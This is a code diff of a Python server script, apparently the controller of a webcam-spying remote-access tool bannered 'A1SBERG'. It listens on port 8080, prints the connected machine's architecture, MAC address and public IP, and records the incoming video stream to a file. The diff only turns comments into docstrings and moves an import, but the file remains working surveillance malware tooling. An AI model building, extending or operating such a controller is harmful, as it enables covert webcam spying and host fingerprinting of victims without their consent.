@@ -8,7 +8,7 @@ banner = """
                                 ~ A1SBERG
 """
 
-import socket, cv2, numpy as np, threading
+import socket, cv2, numpy as np, threading, signal
 
 # Server setup
 h, p, b = "0.0.0.0", 8080, 1024*128
@@ -21,8 +21,8 @@ print(f"[*] Listening on {h}:{p} ...")
 conn, addr = srv.accept()
 print(f"[+] Connection from {addr[0]}:{addr[1]} Received!")
 
-# Helper function to receive string data with length prefix
 def recv_string(sock):
+    """Helper function to receive string data with length prefix"""
     length = int.from_bytes(sock.recv(4), 'little')
     return sock.recv(length).decode('utf-8')
 
@@ -45,8 +45,8 @@ print(f"[+] Architecture: {architecture}")
 print(f"[+] MAC Address: {mac_address}")
 print(f"[+] Public IP: {public_ip}")
 
-# Video capture handler
 def vcap():
+    """Video capture handler"""
     fourcc = cv2.VideoWriter_fourcc(*'mp4v')
     out = cv2.VideoWriter('output.mp4', fourcc, 30.0, (640, 480))
     while True:
@@ -63,13 +63,12 @@ def vcap():
         if cv2.waitKey(1) & 0xFF == ord('q'): break
     out.release()
     cv2.destroyAllWindows()
-
-# Handle Ctrl+C to prevent stopping the program
+   
 def signal_handler(signum, frame):
+    """Handle Ctrl+C to prevent stopping the program"""
     print("Press 'q' to quit")
 
 # Catching the Ctrl+C event
-import signal
 signal.signal(signal.SIGINT, signal_handler)
 
 # Start video capturing
